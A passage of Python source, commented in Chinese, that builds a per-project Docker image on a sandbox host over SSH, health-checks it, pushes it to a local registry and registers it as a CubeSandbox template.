    与 build_project_image 内部用同一算法，供 _phase_build_sandbox 判断是否需重建。
    """
    dep_hash = _dependency_fingerprint(project_root)
    return f"v{_BUILDER_VERSION}-{spec.deps_hash()}-{dep_hash}"


def build_project_image(spec: EnvSpec, project_root: str | Path,
                        ssh: SSHConfig | None = None) -> BuildResult:
    """EnvSpec + 项目根 → 在沙箱机构建专属镜像（自带完整源码）+ create-from-image。

    方案 B：项目源码 COPY 进 /workspace，构建期离线编译自测证明闭包完整。
    步骤：打包源码 + 生成 Dockerfile/warmup → SSH 传文件+解包 → docker build
         → envd /health 自测 → /workspace 离线编译自测 → create-from-image。
    """
    ssh = ssh or SSHConfig.from_secret_store()
    if ssh is None:
        return BuildResult(False, message="沙箱机 SSH 凭据未配置（secret_store 缺 sandbox_host_ssh_*）")

    project_root = Path(project_root)

    # 源码指纹纳入 tag：源码变了要重建（与 deps_hash 双指纹）。
    src_tarball = _make_source_tarball(project_root)
    import hashlib
    src_hash = hashlib.sha256(src_tarball).hexdigest()[:12]
    full_hash = f"{spec.deps_hash()}-{src_hash}"
    tag = f"sandbox-proj-{spec.project_id[:12]}:{full_hash}"
    remote_dir = f"/tmp/swarm-build/{spec.project_id[:12]}-{full_hash}"

    dockerfile = generate_dockerfile(spec, src_included=True)
    has_maven = _has_build_tool(spec, "maven")
    has_gradle = _has_build_tool(spec, "gradle")
    selftest = _selftest_command(spec)

    try:
        with SSHRunner(ssh) as r:
            # 1) 传 Dockerfile
            r.put_text(dockerfile, f"{remote_dir}/Dockerfile")
            # 2) Maven settings.xml（镜像源）。warmup 现在直接对 /workspace 真项目编译预热，
            #    不再需要精简 warmup pom（v3：真项目编译才能拉全构建插件，见 generate_dockerfile）。
            if has_maven:
                r.put_text(_MAVEN_SETTINGS, f"{remote_dir}/warmup/settings.xml")
            # 2b) Gradle init.gradle（镜像源，与 settings.xml 对称）。★Dockerfile 里有 COPY，
            #     不传就是构建失败★——两处必须同源判据，故都走 `_has_build_tool`。
            if has_gradle:
                r.put_text(_GRADLE_INIT, f"{remote_dir}/warmup/init.gradle")
            # 3) 传源码 tarball 并在沙箱机解包进 build context 的 project_src/
            import base64
            r.run(f"mkdir -p {shlex.quote(remote_dir)}/project_src", timeout=30)
            # 经 base64 通过 SFTP 写二进制 tar，再解包（避免 SFTP 二进制写入边界问题）
            b64 = base64.b64encode(src_tarball).decode("ascii")
            r.put_text(b64, f"{remote_dir}/project_src.tar.gz.b64")
            code, out, err = r.run(
                f"cd {shlex.quote(remote_dir)} && base64 -d project_src.tar.gz.b64 > project_src.tar.gz "
                f"&& tar -xzf project_src.tar.gz -C project_src && rm -f project_src.tar.gz project_src.tar.gz.b64 "
                f"&& echo SRC_FILES=$(find project_src -type f | wc -l)",
                timeout=120,
            )
            if code != 0:
                return BuildResult(False, image_tag=tag, message=f"源码解包失败(exit={code}): {(out + err)[-300:]}")
            logger.info("项目 %s 源码已传入 build context: %s", spec.project_id, out.strip()[-80:])
            # 4) docker build
            # --provenance=false：buildkit 默认产 OCI image index（含 provenance/attestation 子
            #   manifest）。push 到 registry:2 时 index 被拒（400 manifest invalid，2026-07-06 实证）
            #   → create-from-image 拉不到 → 建模板失败。关掉 provenance 出【单 v2s2 manifest】，
            #   push 干净。（CubeSandbox 0.5.0 起 create-from-image 只从 registry 拉，见第 6 步。）
            logger.info("沙箱机构建镜像 %s (project=%s)", tag, spec.project_id)
            code, out, err = r.run(f"cd {shlex.quote(remote_dir)} && docker build --provenance=false -t {shlex.quote(tag)} . 2>&1", timeout=2400)
            if code != 0:
                return BuildResult(False, image_tag=tag, message=f"docker build 失败(exit={code}): {(out + err)[-500:]}")
            # 5) envd /health 自测（官方模板发布的唯一硬闸门：tpl create-from-image
            #    靠 :49983/health 探针判 READY）。/workspace 离线编译仅作【软诊断】——
            #    沙箱能联网，worker 跑 mvn 时缺的插件会在线补拉、之后 .m2 缓存，
            #    所以不把"完全离线编译"当发布硬条件（避免 PluginResolutionException 误杀好模板）。
            selftest_block = ""
            if selftest:
                selftest_block = (
                    f"docker exec $cid sh -lc {shlex.quote(selftest)} >/tmp/st.log 2>&1 "
                    f"&& echo COMPILE_OK || echo COMPILE_DIAG_FAIL; tail -8 /tmp/st.log 2>/dev/null; "
                )
            probe = (
                f"cid=$(docker run -d -P {shlex.quote(tag)} 2>/dev/null); sleep 6; "
                f"port=$(docker port $cid 49983/tcp 2>/dev/null | head -1 | cut -d: -f2); "
                f"curl -fsS -m 5 localhost:$port/health >/dev/null 2>&1 && echo HEALTH_OK || echo HEALTH_FAIL; "
                f"{selftest_block}"
                f"docker rm -f $cid >/dev/null 2>&1"
            )
            code, out, _ = r.run(probe, timeout=600)
            if "HEALTH_OK" not in out:
                return BuildResult(False, image_tag=tag, message=f"envd /health 自测失败，拒绝发布模板: {out[-300:]}")
            # 离线编译软诊断：通过则镜像 .m2 闭包完整（最优）；失败仅记日志不阻断发布
            # （沙箱联网可在线补拉缺失插件/依赖）。
            compile_diag = "COMPILE_OK" if "COMPILE_OK" in out else (
                "COMPILE_DIAG_FAIL(联网兜底)" if selftest else "no-selftest")
            logger.info("项目 %s 镜像自测: HEALTH_OK, 离线编译诊断=%s", spec.project_id, compile_diag)
            # 5.5) push 到本地 registry（CubeSandbox 0.5.0 治本，2026-07-06 实证）
            # 背景：0.5.0 的 create-from-image「native export」只从 registry 拉镜像、不再读本地
            # dockerd（裸 tag 被当 docker.io 引用→被墙的 Docker Hub 超时 FAILED）。治本=build 后
            # push 到沙箱机本地 registry，create-from-image 用 registry ref（CubeMaster 解析
            # localhost 不出网）。留空 build_registry=旧行为（直接用本地 tag，仅 ≤0.4.0 有效）。
            try:
                from swarm.config import get_config as _get_cfg
                _reg = (getattr(_get_cfg().sandbox, "build_registry", "") or "").strip().rstrip("/")
                _reg_img = (getattr(_get_cfg().sandbox, "build_registry_image", "") or "").strip()
            except Exception:  # noqa: BLE001 — 读配置失败退回旧行为
                _reg, _reg_img = "", ""
            image_ref = tag  # 默认（无 registry）：直接用本地 tag（旧路径）
            if _reg:
                image_ref = f"{_reg}/{tag}"
                # 按需自启本地 registry（幂等：已在跑则 docker run 失败无妨，随后 /v2/ 探活为准）
                if _reg_img and _reg.startswith(("localhost", "127.0.0.1")):
                    _port = _reg.split(":")[-1] if ":" in _reg else "5000"
                    r.run(
                        f"docker inspect swarm-registry >/dev/null 2>&1 || "
                        f"docker run -d -p {shlex.quote(_port)}:5000 --restart=always "
                        f"--name swarm-registry {shlex.quote(_reg_img)} >/dev/null 2>&1 || true",
                        timeout=120,
                    )
                # push（--provenance=false 已保证是单 v2s2 manifest，registry:2 收）
                logger.info("项目 %s push 镜像到本地 registry %s", spec.project_id, image_ref)
                code, out, err = r.run(
                    f"docker tag {shlex.quote(tag)} {shlex.quote(image_ref)} && "
                    f"docker push {shlex.quote(image_ref)} 2>&1", timeout=600)
                if code != 0 or "manifest invalid" in (out + err).lower():
                    return BuildResult(
                        False, image_tag=tag,
                        message=f"push 到 registry {image_ref} 失败(exit={code}): {(out + err)[-400:]}")
            # 6) create-from-image（用 image_ref：有 registry 时=registry 引用，否则=本地 tag）
            # 关键：带 --node 把模板【钉死在 swarm 访问的单一节点】(ssh.host = cube-proxy host_ip)。
            # 不带 --node 时 CubeMaster 会往【所有节点】派构建任务——双网卡机器(.30 有线/.60 无线)
            # 被注册成两个节点，两节点抢同一 cubebox_os_image 磁盘目录 → rootfs rename 竞态 →
            # 一个 READY 一个 FAILED。swarm 经 cube-proxy(.60) 命中 FAILED 节点 → rootfs 没准备好 →
            # MicroVM 起不来 → envd 不存在 → run_command/探活 504。钉单节点后无竞态、与访问路径一致。
            _node = (ssh.host or "").strip()
            _node_opt = f"--node {shlex.quote(_node)} " if _node else ""
            # CubeSandbox 0.4.0 升级必带参数（实测 task 60网段沙箱机验证）：
            # --with-cube-ca=true：0.4.0 引入 CubeEgress(OpenResty MITM 透明代理)，沙箱出网
            #   HTTPS 被 TPROXY(443→8443) 重定向到 CubeEgress 做 MITM。沙箱必须信任 CubeEgress
            #   根 CA 才能完成 TLS 握手——不烤 CA 则【所有 HTTPS 出网 SSL reset】，worker 跑
            #   mvn/npm 拉依赖全废。虽 0.4.0 文档称默认 true，但实测【不显式传则 CA 没装进信任库】，
            #   故必须显式 --with-cube-ca=true（实测加后 curl maven central HTTP=200 拉到依赖）。
            # --allow-internet-access：0.4.0 出网默认走 CubeEgress L7 策略(可能 deny)，显式放行
            #   保证 worker 能联网补拉构建依赖(mvn/npm/go/pip)。
            _v040_opts = "--with-cube-ca=true --allow-internet-access "
            code, out, err = r.run(
                f"cubemastercli tpl create-from-image --image {shlex.quote(image_ref)} "
                f"{_node_opt}{_v040_opts}"
                f"--writable-layer-size 2G --expose-port 49983 --probe 49983 --probe-path /health 2>&1",
                timeout=300,
            )
            import re
            m = re.search(r"(tpl-[0-9a-f]+)", out)
            if not m:
                return BuildResult(False, image_tag=tag, message=f"create-from-image 未返回 template_id: {out[-300:]}")
            template_id = m.group(1)
            # v0.4.0 输出 `job_id: xxx`（冒号），v0.5.0 改成 `job_id=xxx`（等号）——兼容两者，
            # 否则解析失败退回轮询兜底（round29 实证 job=None 即此故）。
            job_m = re.search(r"job_id[:=]\s*([0-9a-f-]+)", out)
            job_id = job_m.group(1) if job_m else None
            logger.info("项目 %s 模板创建任务已提交: tpl=%s job=%s（异步，watch 等 READY）",
                        spec.project_id, template_id, job_id)
            # 7) tpl watch 等模板真正 READY（官方：create-from-image 异步，需 watch 到终态）。
            #    没有 job_id 则退回轮询 tpl info 的 template_status。
            if job_id:
                code, wout, werr = r.run(
                    f"cubemastercli tpl watch --job-id {shlex.quote(job_id)} 2>&1", timeout=1800)
                status_ok = "READY" in wout and "FAILED" not in wout.split("status:")[-1][:40] if "status:" in wout else "READY" in wout
                if "FAILED" in wout or not status_ok:
                    return BuildResult(False, template_id=template_id, image_tag=tag,
                                       message=f"模板构建未达 READY: {wout[-400:]}")
                logger.info("项目 %s 专属模板 READY: %s", spec.project_id, template_id)
            else:
                # 无 job_id：轮询 tpl info 最多 ~10min
                import time as _time
                ready = False
                for _ in range(60):
                    _time.sleep(10)
                    code, iout, _ = r.run(
                        f"cubemastercli tpl info --template-id {shlex.quote(template_id)} 2>&1 | grep -i status",
                        timeout=30)
                    if "READY" in iout:
                        ready = True
                        break
                    if "FAILED" in iout:
                        return BuildResult(False, template_id=template_id, image_tag=tag,
                                           message=f"模板构建 FAILED: {iout[-200:]}")
                if not ready:
                    return BuildResult(False, template_id=template_id, image_tag=tag,
                                       message="模板构建超时未达 READY（>10min）")
            return BuildResult(True, template_id=template_id, image_tag=tag,
                               message=f"模板 {template_id} 已 READY（自带源码, 离线编译诊断={compile_diag}）")
    except Exception as exc:  # noqa: BLE001
        return BuildResult(False, image_tag=tag, message=f"构建异常: {type(exc).__name__}: {exc}")

